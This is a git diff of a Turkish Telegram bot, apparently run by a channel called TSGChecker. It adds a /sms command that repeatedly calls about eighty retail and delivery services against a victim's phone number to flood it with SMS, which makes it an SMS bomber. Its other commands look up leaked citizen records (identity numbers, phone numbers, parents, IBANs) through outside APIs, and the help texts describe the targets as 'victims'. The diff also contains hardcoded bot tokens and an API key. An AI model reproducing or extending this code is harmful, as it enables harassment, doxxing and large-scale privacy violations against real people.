@@ -12,10 +12,15 @@ from youtube_search import YoutubeSearch
 import os
 import types
 import requests
+import urllib3
+
+import hashlib
+from telethon import Button, TelegramClient, events
 import urllib.parse
+import re
 from telebot import TeleBot, types
 
-#
+
 
 def KahveDunyasi(number):    
     try:    
@@ -1511,8 +1516,93 @@ def petrolofisi(number):
     except:
         return False, "Petrol Ofisi"
 
-TOKEN = ("7041067634:AAE4KTivODYQPSrFRKGQij_5UYtWotmRdpA")
+services = {
+    "KahveDunyasi": KahveDunyasi,
+    "Wmf": Wmf,
+    "Icq": Icq,
+    "Suiste": Suiste,
+    "Evidea": Evidea,
+    "Ucdortbes": Ucdortbes,
+    "Ayyildiz": Ayyildiz,
+    "Naosstars": Naosstars,
+    "Koton": Koton,
+    "Metro": Metro,
+    "Akasya": Akasya,
+    "Akbati": Akbati,
+    "Clickme": Clickme,
+    "Happy": Happy,
+    "Komagene": Komagene,
+    "KuryemGelsin": KuryemGelsin,
+    "Porty": Porty,
+    "Taksim": Taksim,
+    "Tasdelen": Tasdelen,
+    "Tasimacim": Tasimacim,
+    "ToptanTeslim": ToptanTeslim,
+    "Uysal": Uysal,
+    "Yapp": Yapp,
+    "YilmazTicaret": YilmazTicaret,
+    "Yuffi": Yuffi,
+    "Beefull": Beefull,
+    "Starbucks": Starbucks,
+    "Dominos": Dominos,
+    "Baydoner": Baydoner,
+    "Pidem": Pidem,
+    "Frink": Frink,
+    "a101": a101,
+    "bim": bim,
+    "defacto": defacto,
+    "istegelsin": istegelsin,
+    "ikinciyeni": ikinciyeni,
+    "migros": migros,
+    "ceptesok": ceptesok,
+    "tiklagelsin": tiklagelsin,
+    "bisu": bisu,
+    "file": file,
+    "ipragraz": ipragraz,
+    "pisir": pisir,
+    "coffy": coffy,
+    "sushico": sushico,
+    "kalmasin": kalmasin,
+    "yotto": yotto,
+    "qumpara": qumpara,
+    "aygaz": aygaz,
+    "pawapp": pawapp,
+    "mopas": mopas,
+    "paybol": paybol,
+    "ninewest": ninewest,
+    "saka": saka,
+    "superpedestrian": superpedestrian,
+    "hayat": hayat,
+    "tazi": tazi,
+    "gofody": gofody,
+    "weescooter": weescooter,
+    "scooby": scooby,
+    "gez": gez,
+    "heyscooter": heyscooter,
+    "jetle": jetle,
+    "rabbit": rabbit,
+    "roombadi": roombadi,
+    "hizliecza": hizliecza,
+    "signalall": signalall,
+    "goyakit": goyakit,
+    "pinar": pinar,
+    "oliz": oliz,
+    "macrocenter": macrocenter,
+    "marti": marti,
+    "karma": karma,
+    "joker": joker,
+    "hop": hop,
+    "kimgbister": kimgbister,
+    "anadolu": anadolu,
+    "total": total,
+    "englishhome": englishhome,
+    "petrolofisi": petrolofisi,
+}
 
+
+TOKEN = ("7031439985:AAH40Lt1QSazakrf7_qCS3mAlWzPMlf9qS0")
+
+brok = types.InlineKeyboardButton(text='Telegram Kanalimiz',url="t.me/TSGChecker")
 
 bot = telebot.TeleBot(TOKEN)
 
@@ -1531,15 +1621,11 @@ def start(message):
         response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
         bot.send_message(message.chat.id, response)
         return
-        
-
-    muzik = open('hosgeldiniz.mp3', 'rb')
-    bot.send_audio(message.chat.id, muzik)
-    muzik.close()
 
     response = f"🍀 Merhaba {user_name}, ({user_id})!\n\n📚 Tsg Oyun Botuna Hoş Geldin. Bu bot, Oyun İndirme Botudur Tamamen ücretsizdir\n\n📮 Sorgular Ücretsiz Olduğu İçin @TSGChecker Katılmak Zorunludur."
 
     
+
     markup = telebot.types.InlineKeyboardMarkup()
     markup.add(
         telebot.types.InlineKeyboardButton("📢 Tsg Kanal", url="https://t.me/TSGChecker"),
@@ -1557,22 +1643,15 @@ def commands(call):
     markup = telebot.types.InlineKeyboardMarkup()
     markup.add(
         telebot.types.InlineKeyboardButton("Ad Soyad", callback_data="sorgu"),
-        telebot.types.InlineKeyboardButton("Tc", callback_data="tc"),
-        telebot.types.InlineKeyboardButton("Tc Plus", callback_data="tcplus"),
-        telebot.types.InlineKeyboardButton("Tc Gsm", callback_data="tcgsm"),        
+        telebot.types.InlineKeyboardButton("Ad Soyad İl", callback_data="sorgu1"),
+        telebot.types.InlineKeyboardButton("TC Sorgu", callback_data="tc"),
+        telebot.types.InlineKeyboardButton("TC Plus", callback_data="tc_plus"),
+        telebot.types.InlineKeyboardButton("TC Gsm", callback_data="tc_gsm"),
         telebot.types.InlineKeyboardButton("Aile", callback_data="aile"),
-        telebot.types.InlineKeyboardButton("Aile Pro", callback_data="ailepro"),
-       
-        telebot.types.InlineKeyboardButton("Adres", callback_data="adres"),
-                telebot.types.InlineKeyboardButton("İban", callback_data="iban"), 
+        telebot.types.InlineKeyboardButton("Iban Sorgu", callback_data="iban_sorgu"),
         
-        telebot.types.InlineKeyboardButton("okul no", callback_data="okulno"), 
+        telebot.types.InlineKeyboardButton("Yazi", callback_data="yazi"),
         
-        
-        
-        telebot.types.InlineKeyboardButton("sicil", callback_data="sicil"), 
-        
-        telebot.types.InlineKeyboardButton("burc", callback_data="burc"), 
         telebot.types.InlineKeyboardButton("⬅️ Geri", callback_data="back")
     )
 
@@ -1581,33 +1660,28 @@ def commands(call):
 @bot.callback_query_handler(func=lambda call: call.data == "back")
 def back(call):
     start(call.message)
-@bot.callback_query_handler(func=lambda call: call.data in ["sorgu", "tc", "tcplus", "tcgsm","aile","ailepro","adres","iban","okulno","sicil","burc"])
+
+@bot.callback_query_handler(func=lambda call: call.data in ["sorgu", "tc", "tc_gsm", "aile", "tc_plus", "yazi", "iban_sorgu","yazi"])
 def other_commands(call):
     if call.data == "sorgu":
-        response = "Ad Soyad Sorgu Yardım:\nörnek: /sorgu -isim Ahmet -soyisim Kaya -il Diyarbakır"
+        response = "Ad Soyad Sorgu Yardım:\n\n/sorgu -isim <kurbanın adı> -soyisim <kurbanın soy adı> \n\nİki isimli Sorgulama için -isim2 kullanabilirsiniz örnek:\n/sorgu -isim betül -isim2 berra -soyisim kapancı"
     elif call.data == "tc":
-        response = "TC Sorgu Yardım:\nörnek: /tc 11111111110"
-    elif call.data == "tcplus":
-        response = "TC Plus Sorgu Yardım:\nörnek: /tcplus 11111111110"
-    elif call.data == "tcgsm":
-        response = "TC Gsm Sorgu Yardım:\nörnek: /tcgsm 11111111110" 
+        response = "TC Sorgu Yardım:\n\n/tc <kurbanın tc>\n\nYardım İçin Sohbet Grubumuza Gelebilirsin. @TSGChecker"
+    elif call.data == "sorgu1":
+        response = "Ad Soyad Sorgu Yardım:\n\n/sorgu1 -isim <kurbanın adı> -soyisim <kurbanın soy adı> -il <kurbanın il>\n\nİki isimli Sorgulama için -isim2 kullanabilirsiniz örnek:\n/sorgu -isim betül -isim2 berra -soyisim kapancı -il istanbul"
+    elif call.data == "tc_gsm":
+        response = "TC Gsm Yardım:\n\n/tcgsm <kurbanın tc>\n\nÇekinmeden Sohbet Edebileceğin Sohbet Grubumuza Katıl @TSGChecker."
     elif call.data == "aile":
-        response = "Aile Sorgu Yardım:\nörnek: /aile 11111111110"
-    elif call.data == "ailepro":
-        response = "Aile Pro Sorgu Yardım:\nörnek: /ailepro 11111111110"
-    elif call.data == "adres":
-        response = "Adres Sorgu Yardım:\nörnek: /adres 11111111110"              
-    elif call.data == "iban":
-        response = "İban Sorgu Yardım:\nörnek: /iban TR317377373722"
-    elif call.data == "okulno":
-        response = "Okul No Sorgu Yardım:\nörnek: /okulno 11111111110"    
-    elif call.data == "sicil":
-        response = "Sicil Sorgu Yardım:\nörnek: /sicil 11111111110"
-    elif call.data == "burc":
-        response = "Burc Sorgu Yardım:\nörnek: /burc 11111111110"
-
-
-            
+        response = "Aile Sorgu Yardım:\n\n/aile <kurbanın tc>\n\nHer Gün Çok Güzel Paylaşımlar Olan Kanalımıza Katıl. @TSGChecker"
+        
+    elif call.data == "tc_plus":
+        response = "TC Plus Sorgu Yardım:\n\n/tcplus <kurbanın tc>\n\nSohbet Grubumuza Katılmaya Ne Dersin?"
+    elif call.data == "yazi":
+        response = "Yazi Yardım:\n\n/yaz - Yazılan Metini Deftere Yazar"
+        
+    elif call.data == "iban_sorgu":
+        response = "İban Sorgu Yardım:\n\n/iban <kurbanın iban>\n\nkurbanın ibanı birleşik girin örnek TR317377373722"
+         
 
     markup = telebot.types.InlineKeyboardMarkup()
     markup.add(
@@ -1623,14 +1697,7 @@ def is_user_member(user_id, chat_id):
     except Exception as e:
         print(str(e))
         return False
-        
-        
-        
-        
-      
-        
-        
-        
+
 @bot.message_handler(commands=["tc"])
 def tc_sorgula(message):
     user_id = message.from_user.id
@@ -1702,24 +1769,6 @@ def tc_sorgula(message):
         bot.send_message(message.chat.id, cevap)
 
 
-@bot.message_handler(commands=['sms'])
-def send_sms(message):
-    args = message.text.split()[1:]
-    if len(args) != 1:
-        bot.reply_to(message, "𝐺𝑆𝑀 𝐺𝑖𝑟𝑖𝑛 𝑂̈𝑟𝑛: 555* 10")
-        return
-    telefon_no = args[0]
-    sms_sayisi = random.uniform(1, 100)
-
-    bot.reply_to(message, f"𝑆𝑀𝑆 𝑔𝑜̈𝑛𝑑𝑒𝑟𝑖𝑚𝑖 𝐵𝑎𝑠̧𝑙𝑎𝑑ı. 𝐵𝑖𝑡𝑡𝑖𝑔̆𝑖𝑛𝑑𝑒 𝐵𝑖𝑙𝑑𝑖𝑟𝑖𝑙𝑒𝑐𝑒𝑘!")
-
-    for _ in range(sms_sayisi):
-        servis_adi = random.choice(list(services.keys()))
-        service = services[servis_adi]
-        service(telefon_no)
-
-    bot.reply_to(message, f"{sms_sayisi} 𝑎𝑑𝑒𝑡 𝑆𝑀𝑆 𝑔𝑜̈𝑛𝑑𝑒𝑟𝑖𝑚𝑖 𝑡𝑎𝑚𝑎𝑚𝑙𝑎𝑛𝑑ı.")
-    
 
 @bot.message_handler(commands=["tcplus"])
 def tcplus_sorgula(message):
@@ -1807,7 +1856,6 @@ def tcplus_sorgula(message):
     else:
         cevap = "╭──────────────────────╮\n┃ 📛 𝖸𝖺𝗇𝗅ı𝗌̧ 𝖪𝗈𝗆𝗎𝗍 𝖪𝗎𝗅𝗅𝖺𝗇ı𝗆ı\n┃ ✅ 𝖣𝗈𝗀̆𝗋𝗎 𝖥𝗈𝗋𝗆𝖺𝗍: /tcplus <kurbanın tc>\n╰──────────────────────╯"
         bot.send_message(message.chat.id, cevap)
-
 
 
 @bot.message_handler(commands=["aile"])
@@ -1913,16 +1961,13 @@ def sorgu(message):
 
     # Parse the command arguments
     text = message.text
+    
     words = text.split()
-
-    # Initialize parameters
     isim = None
     isim2 = None
     soyisim = None
     il = None
     ilce = None
-
-    # Parse the user input
     for i in range(len(words)):
         if words[i] == "-isim" and i < len(words) - 1:
             isim = words[i + 1]
@@ -1934,109 +1979,89 @@ def sorgu(message):
             il = words[i + 1]
         elif words[i] == "-ilce" and i < len(words) - 1:
             ilce = words[i + 1]
-
     if not isim or not soyisim:
-        bot.reply_to(message, "Yanlış Kullanım! Doğru format: /sorgu -isim <isim> -soyisim <soyisim> [-il <il>] [-ilce <ilce>]")
+        text = "Yanlış Kullanım Yapıldı!\n -> /sorgu -isim abdulselam -soyisim deniz -il istanbul"
+        bot.send_message(message.chat.id, text)
         return
-
+    user_id = message.from_user.id
+    user_name = message.from_user.first_name
+ 
     chat_id = message.chat.id
-
-    log_message = (f"Yeni Sorgu Atıldı!\n"
-                   f"Sorgulanan İsim: {isim}\n"
-                   f"Sorgulanan Soyisim: {soyisim}\n"
-                   f"Sorgulanan İl: {il}\n"
-                   f"Sorgulanan İlçe: {ilce}\n"
-                   f"Sorgulayan ID: {user_id}\n"
-                   f"Sorgulayan Adı: {user_name}\n"
-                   f"Kanal ID: {chat_id}")
-
-    bot.send_message(-1002017751874, log_message)
-
+ 
     start_message = bot.send_message(chat_id, "İşleminiz Gerçekleştiriliyor, Lütfen Bekleyin...")
-
-    try:
-        # Construct the API URL with proper encoding
-        api_url = "https://sowixapi.online/api/sowixapi/adsoyadilce.php"
-        params = {
-            'ad': f"{isim} {isim2}" if isim2 else isim,
-            'soyad': soyisim
-        }
-        if il:
-            params['il'] = il
-        if ilce:
-            params['ilce'] = ilce
-
-        encoded_params = urllib.parse.urlencode(params)
-        api_url = f"{api_url}?{encoded_params}"
-
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
-        }
-
-        response = requests.get(api_url, headers=headers)
-        response.raise_for_status()
-        data = response.json()
-
-        if data.get("success") == "true":
-            number = data.get("number", 0)
-            if number > 0:
-                people = data.get("data", [])
-                info = ""
+   
+    if isim2:
+        isim_birlestirmesi = urllib.parse.quote(f"{isim} {isim2}")
+    else:
+        isim_birlestirmesi = urllib.parse.quote(isim)
+    if il and ilce:
+        AdSoyadApisi_url = f"http://us.batincheck.xyz/umutapiservices/adsoyad.php?auth=icimdekiseytaninensesindeyim&ad={isim_birlestirmesi}&soyad={soyisim}&il={il}&ilce={ilce}"
+    elif il:
+        AdSoyadApisi_url = f"http://us.batincheck.xyz/umutapiservices/adsoyad.php?auth=icimdekiseytaninensesindeyim&ad={isim_birlestirmesi}&soyad={soyisim}&il={il}"
+    else:
+        AdSoyadApisi_url = f"http://us.batincheck.xyz/umutapiservices/adsoyad.php?auth=icimdekiseytaninensesindeyim&ad={isim_birlestirmesi}&soyad={soyisim}"
+    response = requests.get(AdSoyadApisi_url)
+    data = response.json()
+    if data["success"] == "true":
+        number = data["number"]
+        if number > 0:
+            people = data["data"]
+            with open('sonuclar.txt', 'w', encoding='utf-8') as file:
                 for person in people:
+                    tsgid = person.get("ID", "Bilinmiyor")
                     tc = person.get("TC", "Bilinmiyor")
-                    ad = person.get("ADI", "Bilinmiyor")
-                    soyad = person.get("SOYADI", "Bilinmiyor")
+                    ad = person.get("AD", "Bilinmiyor")
+                    soyad = person.get("SOYAD", "Bilinmiyor")
+                    gsm = person.get("GSM", "Bilinmiyor")
                     dogumtarihi = person.get("DOGUMTARIHI", "Bilinmiyor")
-                    nufusil = person.get("NUFUSIL", "Bilinmiyor")
-                    nufusilce = person.get("NUFUSILCE", "Bilinmiyor")
+                    olumtarihi = person.get("OLUMTARIHI", "Bilinmiyor")
+                    nufusil = person.get("MEMLEKETIL", "Bilinmiyor")
+                    nufusilce = person.get("MEMLEKETILCE", "Bilinmiyor")
                     anneadi = person.get("ANNEADI", "Bilinmiyor")
                     annetc = person.get("ANNETC", "Bilinmiyor")
+                    sirano = person.get("BIREYSIRANO", "Bilinmiyor")
+                    cinsiyet = person.get("CINSIYET", "Bilinmiyor")
+                    aileno = person.get("AILESIRANO", "Bilinmiyor")
                     babaadi = person.get("BABAADI", "Bilinmiyor")
+                    medenihal = person.get("MEDENIHAL", "Bilinmiyor")
                     babatc = person.get("BABATC", "Bilinmiyor")
                     uyrugu = person.get("UYRUK", "Bilinmiyor")
-
-                    info += (f"""╭━━━━━━━━━━━━━╮
+                    info = f"""
+╭━━━━━━━━━━━━━╮
 ┃➥ @TSGChecker
+┃➥ TSG-İD {tsgid}
+┃➥ Owner @TSGxYUNUS
 ╰━━━━━━━━━━━━━╯
 ╭━━━━━━━━━━━━━━╮
-┃➥TC: {tc}
+┃➥ TC: {tc}
 ┃➥ ADI: {ad}
 ┃➥ SOYADI: {soyad}
 ┃➥ DOĞUM TARİHİ: {dogumtarihi}
+┃➥ ÖLÜM TARİHİ: {olumtarihi}
 ┃➥ ANNE ADI: {anneadi}
 ┃➥ ANNE TC: {annetc}
 ┃➥ BABA ADI: {babaadi}
 ┃➥ BABA TC: {babatc}
 ┃➥ İL: {nufusil}
 ┃➥ İLÇE: {nufusilce}
+┃➥ GSM: {gsm}
+┃➥ SIRANO: {sirano}
+┃➥ AİLE SIRANO: {aileno}
 ┃➥ UYRUK: {uyrugu}
-╰━━━━━━━━━━━━━━╯
-""")
-
-                file_name = "Sonuçlar.txt"
-                with open(file_name, 'w', encoding='utf-8') as file:
-                    file.write(info)
-
-                with open(file_name, 'rb') as file:
-                    bot.send_document(message.chat.id, file)
-                    bot.delete_message(chat_id, start_message.message_id)
-            else:
-                bot.send_message(message.chat.id, "Veri Bulunamadı.")
+┃➥ Cinsiyet : {cinsiyet}
+┃➥ Medeni Hali : {medenihal}
+╰━━━━━━━━━━━━━━╯"""
+                    file.write(info + "\n\n")
+            with open('sonuclar.txt', 'rb') as file:
+                bot.send_document(message.chat.id, file)
                 bot.delete_message(chat_id, start_message.message_id)
         else:
-            bot.send_message(message.chat.id, "Data bulunamadı.")
-            bot.delete_message(chat_id, start_message.message_id)
-
-    except requests.exceptions.HTTPError as http_err:
-        bot.send_message(message.chat.id, f"HTTP hata oluştu: {http_err}")
-        bot.delete_message(chat_id, start_message.message_id)
-    except ValueError:
-        bot.send_message(message.chat.id, "API'den dönen veri JSON formatında değil. Lütfen daha sonra tekrar deneyiniz.")
-        bot.delete_message(chat_id, start_message.message_id)
-    except Exception as err:
-        bot.send_message(message.chat.id, f"Bir hata oluştu: {err}")
-        bot.delete_message(chat_id, start_message.message_id)
-
+                bot.send_message(message.chat.id, "Veri Bulunamadı.")
+                bot.delete_message(chat_id, start_message.message_id)
+    else:
+                bot.send_message(message.chat.id, "Data bulunamadı.")
+                bot.delete_message(chat_id, start_message.message_id)
+    
 import requests
 
 @bot.message_handler(commands=["tcgsm"])
@@ -2088,7 +2113,39 @@ def tcgsm_sorgula(message):
 
 
 import requests
+@bot.message_handler(commands=['sms'])
+def send_sms(message):
+    
+    
+    user_id = message.from_user.id
+    user_name = message.from_user.first_name
 
+    channel_id = -1002048770700
+    group_id = -1002088355655
+
+    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
+        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
+        bot.send_message(message.chat.id, response)
+        return
+
+    
+    
+    args = message.text.split()[1:]
+    if len(args) != 1:
+        bot.reply_to(message, "𝐺𝑆𝑀  𝐺𝑖𝑟𝑖𝑛 𝑂̈𝑟𝑛: /sms 5515432263")
+        return
+    telefon_no = args[0]
+    sms_sayisi = random.randint(5, 20)
+
+    bot.reply_to(message, f"Sᴍꜱʟᴇʀ Bᴀꜱᴀʀıʏʟᴀ Gᴏɴᴅᴇʀɪʟɪʏᴏʀ Bɪᴛᴛɪɢ̆ɪɴᴅᴇ Bɪʟɢɪʟᴇɴᴅɪʀɪʟᴇᴄᴇᴋꜱɪɴ.!!")
+
+    for _ in range(sms_sayisi):
+        servis_adi = random.choice(list(services.keys()))
+        service = services[servis_adi]
+        service(telefon_no)
+
+    bot.reply_to(message, f"{sms_sayisi} 𝑎𝑑𝑒𝑡 𝑆𝑀𝑆 𝑔𝑜̈𝑛𝑑𝑒𝑟𝑖𝑚𝑖 𝑡𝑎𝑚𝑎𝑚𝑙𝑎𝑛𝑑ı.")
+    
 @bot.message_handler(commands=["okulno"])
 def aile_sorgula(message):
     user_id = message.from_user.id
@@ -2147,6 +2204,7 @@ def aile_sorgula(message):
         bot.delete_message(message.chat.id, start_message.message_id)
 
 # Diğer fonksiyonları ve bot ayarlarınızı buraya ekle
+
 
 
 
@@ -2240,6 +2298,10 @@ def tcgsm_sorgula(message):
         
         output = f"""
         ╔═══════════════
+        ╟ @TSGChecker
+        ╚═══════════════
+
+        ╔═══════════════
         ╟ TC: {result["KIMLIKNO"]}
         ╟ ADI: {result["ISIM"]}
         ╟ SOY ADI: {result["SOYISIM"]}
@@ -2263,7 +2325,6 @@ def tcgsm_sorgula(message):
         bot.send_message(message.chat.id, f"API'den veri alınamadı. Hata: {e}")
 
 # BOT AKTİF EDİLDİ...
-
 
 
 @bot.message_handler(commands=['yaz'])
